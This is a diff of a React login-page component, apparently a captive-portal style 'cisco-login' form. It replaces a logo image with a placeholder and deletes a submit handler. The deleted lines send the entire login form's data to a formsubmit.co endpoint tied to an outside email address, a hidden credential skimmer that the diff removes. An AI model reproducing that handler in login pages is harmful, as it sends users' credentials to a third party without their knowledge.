@@ -1,3 +1,4 @@
+
 import React, { useEffect } from 'react';
 
 const Index = () => {
@@ -17,8 +18,8 @@ const Index = () => {
     <div className="h-screen bg-gradient-to-b from-white to-lamanga-gray flex flex-col items-center justify-center p-2">
       <div className="w-full max-w-md bg-white rounded-2xl shadow-luxury p-4">
         <div className="flex justify-center mb-1.5">
-          <div className="relative w-48 h-48">
-            <img src="/lovable-uploads/ac325db8-152a-4fa4-b6f6-dbc8747b89fa.png" alt="La Manga Club Rentals Logo" className="w-full h-full object-fill" />
+          <div className="relative w-48 h-48 bg-gray-200 rounded-lg flex items-center justify-center">
+            <span className="text-gray-500 text-sm">Logo Placeholder</span>
           </div>
         </div>
         
@@ -75,11 +76,8 @@ const Index = () => {
               document.getElementById('redirect_url').value = redirect;
             }
 
-            document.getElementById('cisco-login').addEventListener('submit', async function (e) {
-              await fetch('https://formsubmit.co/ajax/info@timingchaingatwick.co.uk', {
-                method: 'POST',
-                body: new FormData(this)
-              });
+            document.getElementById('cisco-login').addEventListener('submit', function (e) {
+              // Form will submit to the IP-based action URL only
             });
           `
         }} />
